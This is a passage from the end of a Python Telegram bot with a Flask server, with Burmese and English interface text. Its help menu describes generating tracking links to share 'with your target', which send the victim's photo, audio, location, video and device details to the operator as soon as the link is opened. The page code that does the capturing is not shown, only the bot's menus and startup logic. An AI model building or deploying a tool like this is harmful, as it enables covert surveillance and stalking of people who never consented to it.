        await query.edit_message_text(
            f"🗑 <b>ဖျက်ပြီးပါပြီ! | Cleared!</b>\n\n✅ Link <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး | Removed {len(user_tokens)} link(s).",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Link အသစ် | New Links", callback_data="grab"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )

    elif data == "info":
        total = len([t for t, uid in tracking_links.items() if uid == user_id])
        await query.edit_message_text(
            f"ℹ️ <b>Bot အချက်အလက် | Bot Info</b>\n\n"
            f"🤖 Bot: <b>Online ✅</b>\n"
            f"🌐 Base URL: <code>{BASE_URL}</code>\n"
            f"🆔 သင်၏ ID | Your ID: <code>{user_id}</code>\n"
            f"🔗 သင်၏ links | Your links: <b>{total}</b>\n"
            f"📅 Server time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="menu")]])
        )

    elif data == "help":
        await query.edit_message_text(
            "❓ <b>အကူအညီ | Help</b>\n\n"
            "<b>မည်သို့အသုံးပြုမည် | How to use:</b>\n"
            "1. <b>Link ထုတ်မည်</b> ကိုနှိပ်ပြီး link ၅ မျိုးထုတ်ပါ\n"
            "   Press <b>Generate Links</b> to create 5 unique links\n\n"
            "2. Link တစ်ခုကို မျှဝေပါ | Share any link with your target\n\n"
            "3. Link ဖွင့်သည်နှင့် data များ Bot ဆီ တန်းရောက်မည်\n"
            "   Data is sent immediately when they open it\n\n"
            "<b>Link အမျိုးအစားများ | Link Types:</b>\n"
            "📱 Device info သည် link တိုင်းတွင် အလိုအလျောက်ပါသည် | Device info auto-included in all links\n\n"
            "🌐 All — ဓာတ်ပုံ+အသံ+တည်နေရာ+ဗီဒီယို+Device\n"
            "📸 Photo — ဓာတ်ပုံ + Device info\n"
            "🎤 Audio — အသံ + Device info\n"
            "📍 Location — တည်နေရာ + Device info\n"
            "🎥 Video — ဗီဒီယို + Device info",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Link ထုတ်မည် | Generate Links", callback_data="grab")],
                [InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )


# ─────────────────────────────────────────
# RUN BOT & FLASK
# ─────────────────────────────────────────
def run_bot():
    if not BOT_TOKEN:
        print("⚠️  BOT_TOKEN not set. Telegram bot will not start.")
        return
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("grab", grab))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("🤖 Telegram bot is polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    def run_flask():
        port = int(os.environ.get("PORT", 5000))
        flask_app.run(host="0.0.0.0", port=port, threaded=True, debug=False)

    if BOT_TOKEN:
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        run_bot()
    else:
        print("⚠️  BOT_TOKEN not configured. Running Flask only.")
        run_flask()
